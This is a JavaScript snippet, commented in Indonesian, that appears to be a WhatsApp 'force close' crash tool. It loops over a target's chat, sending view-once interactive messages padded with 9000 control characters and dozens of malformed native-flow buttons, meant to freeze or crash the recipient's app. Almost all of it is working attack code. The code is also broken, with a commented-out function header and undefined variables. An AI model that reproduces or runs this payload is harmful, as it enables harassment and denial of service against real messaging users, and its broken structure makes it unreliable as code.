(function(){
  const target = localStorage.getItem("bug_target");
  if (!target) return alert("Target belum diatur!");
  alert("🚀 Menjalankan BUG: FORCECLOSEV2 ke " + target);
  // async function fuckgroup(target, count) {
  for (let i = 0; i < count; i++) {
    const messageContent = generateWAMessageFromContent(jid, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Fuck you",
              hasMediaAttachment: false
            },
            body: {
              text: "\u0003".repeat(9000), // Buat Delay, kalau ga suka ubh aj ke crash textnya ui
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                { name: "single_select", buttonParamsJson: GetsuVoidsTravasX + "\u0003" }, //kalau ga kedefiend getsu, del aja :/ + gw males :v
                { name: "payment_method", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "call_permission_request", buttonParamsJson: GetsuVoidsTravasX + "\u0003", voice_call: "call_galaxy" },
                { name: "form_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "wa_payment_learn_more", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "wa_payment_transaction_details", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "wa_payment_fbpin_reset", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "catalog_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "payment_info", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "review_order", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "send_location", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "payments_care_csat", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "view_product", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "payment_settings", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "address_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "automated_greeting_message_view_catalog", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "open_webview", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "message_with_link_status", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "payment_status", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "galaxy_costum", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "extensions_message_v2", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "landline_call", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "mpm", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "cta_copy", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "cta_url", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "review_and_pay", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "galaxy_message", buttonParamsJson: GetsuVoidsTravasX + "\u0003" },
                { name: "cta_call", buttonParamsJson: GetsuVoidsTravasX + "\u0003" }
              ]
            }
          }
        }
      }
    }, {});

    await yuki.relayMessage(jid, messageContent.message, {
      messageId: messageContent.key.id
    });

    console.log(chalk.red(`Sukses kirim BugViewOnce ke`));
  }
}
